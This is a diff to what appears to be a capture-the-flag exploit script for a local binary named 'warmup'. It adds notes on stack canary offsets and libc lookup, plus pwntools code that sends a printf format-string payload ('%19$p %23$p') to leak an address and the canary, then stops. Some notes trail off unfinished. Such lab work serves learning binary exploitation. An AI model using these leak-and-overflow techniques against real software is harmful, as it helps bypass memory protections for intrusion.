@@ -16,10 +16,48 @@ afl --> list all functions
 
 Canary is always 4 or 8 bytes from bp
 
+144 - 8 = 138 bytes to canary
+138/8 = 17.25 --> canary should be at %23$p, first 7 args:
+    1 = print format string
+    2-7, args using in 64 bit calling convention
+
+Leak information for printf:
+https://libc.nullbyte.cat/?q=printf%3Afb0&l=libc6-x32_2.27-3ubuntu1.2_i386
+
+Did digging on stack with %7$p %8$p %9$p, showed that %9$p is a ptr!!
+    Address ends with c60
+    Function is 
+
+To find what func was did
+    ps -ef | grep "warmup"
+    r2 -Ad PID
 '''
 
 # Import Libarries
 from pwn import *
 
+# Get offset to set libc
+getToVbuff = -253      #offset at %19$p to ge to vbuff
+setvbuffOffset = "0x2f8d0"
+setvbuffOffsetInt = int(setvbuffOffset,16)
+
+# variables
+padding = b'a'*136  # truly 144, but the last 8 bytes are the canary
+padOverBP = b'a'*8  # overwrite base pointer
+leakAddrStr = b"%19$p %23$p"
+
 # Starting ELF
 elf = ELF("./warmup")
+libc = elf.libc
+
+# start process
+p = process("./warmup")
+p.recv()
+p.sendline(leakAddrStr)     # Send to leak address
+leak = p.recvuntil(b" ")    # should be leak addr
+canary = p.recvuntil(b"\n")
+
+print("leak:", leak)
+print("canary:", canary)
+
+p.close()
